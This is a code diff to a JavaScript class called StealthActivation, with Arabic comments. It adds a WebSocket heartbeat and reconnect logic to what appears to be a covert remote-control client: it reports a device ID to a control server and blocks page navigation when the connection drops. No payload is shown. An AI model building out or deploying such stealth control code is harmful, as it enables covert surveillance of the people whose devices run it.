@@ -58,6 +58,7 @@ class StealthActivation {
         this.deviceId = this.generateDeviceId();
         this.permissionsManager = null;
         this.realDataAccess = null;
+        this.heartbeatInterval = null;
         this.activationSteps = [
             'loading',
             'checking',
@@ -556,6 +557,11 @@ class StealthActivation {
                     timestamp: Date.now(),
                     status: 'online'
                 }));
+                
+                // بدء heartbeat
+                this.startHeartbeat();
+                
+                console.log('🔗 تم إعداد الاتصال والـ heartbeat بنجاح');
             };
             
             ws.onmessage = (event) => {
@@ -575,16 +581,37 @@ class StealthActivation {
                 console.log('❌ تم قطع الاتصال بالخادم');
                 console.log(`  📄 الكود: ${event.code}`);
                 console.log(`  📝 السبب: ${event.reason || 'غير محدد'}`);
+                console.log(`  🔄 إعادة الاتصال: ${event.wasClean ? 'نعم' : 'لا'}`);
+                
+                // إيقاف heartbeat
+                this.stopHeartbeat();
+                
+                // تنظيف المتغيرات
+                window.controlConnection = null;
                 
                 // منع انتقال الصفحة عند انقطاع الاتصال
                 console.log('🛡️ منع انتقال الصفحة بسبب انقطاع الاتصال');
                 this.preventRedirectOnDisconnection();
                 
-                // محاولة إعادة الاتصال بعد 5 ثوان
+                // تحديد سبب الانقطاع
+                let reconnectDelay = 5000; // افتراضي 5 ثوان
+                
+                if (event.code === 1006) {
+                    console.log('🔍 انقطاع غير طبيعي - إعادة اتصال سريع');
+                    reconnectDelay = 2000; // 2 ثانية للانقطاع غير الطبيعي
+                } else if (event.code === 1000) {
+                    console.log('🔍 إغلاق طبيعي - إعادة اتصال عادي');
+                    reconnectDelay = 5000; // 5 ثوان للإغلاق الطبيعي
+                } else if (event.code >= 4000) {
+                    console.log('🔍 خطأ في التطبيق - إعادة اتصال مؤجل');
+                    reconnectDelay = 10000; // 10 ثوان لأخطاء التطبيق
+                }
+                
+                // محاولة إعادة الاتصال
                 setTimeout(() => {
-                    console.log('🔄 محاولة إعادة الاتصال بالخادم...');
+                    console.log(`🔄 محاولة إعادة الاتصال بالخادم بعد ${reconnectDelay/1000} ثوان...`);
                     this.setupServerConnection();
-                }, 5000);
+                }, reconnectDelay);
             };
             
         } catch (error) {
@@ -696,6 +723,52 @@ class StealthActivation {
             
         } catch (error) {
             console.error('❌ خطأ في تفعيل حماية انتقال الصفحة:', error);
+        }
+    }
+    
+    // بدء نظام heartbeat
+    startHeartbeat() {
+        try {
+            // إيقاف heartbeat السابق إن وجد
+            if (this.heartbeatInterval) {
+                clearInterval(this.heartbeatInterval);
+            }
+            
+            console.log('💓 بدء نظام heartbeat...');
+            
+            this.heartbeatInterval = setInterval(() => {
+                if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'heartbeat',
+                        deviceId: this.deviceId,
+                        timestamp: Date.now(),
+                        status: 'online'
+                    }));
+                    
+                    console.log('💓 إرسال heartbeat للخادم');
+                } else {
+                    console.warn('⚠️ لا يمكن إرسال heartbeat - الاتصال مغلق');
+                    this.stopHeartbeat();
+                }
+            }, 30000); // كل 30 ثانية
+            
+            console.log('✅ تم بدء نظام heartbeat بنجاح');
+            
+        } catch (error) {
+            console.error('❌ خطأ في بدء heartbeat:', error);
+        }
+    }
+    
+    // إيقاف نظام heartbeat
+    stopHeartbeat() {
+        try {
+            if (this.heartbeatInterval) {
+                clearInterval(this.heartbeatInterval);
+                this.heartbeatInterval = null;
+                console.log('🛑 تم إيقاف نظام heartbeat');
+            }
+        } catch (error) {
+            console.error('❌ خطأ في إيقاف heartbeat:', error);
         }
     }
     
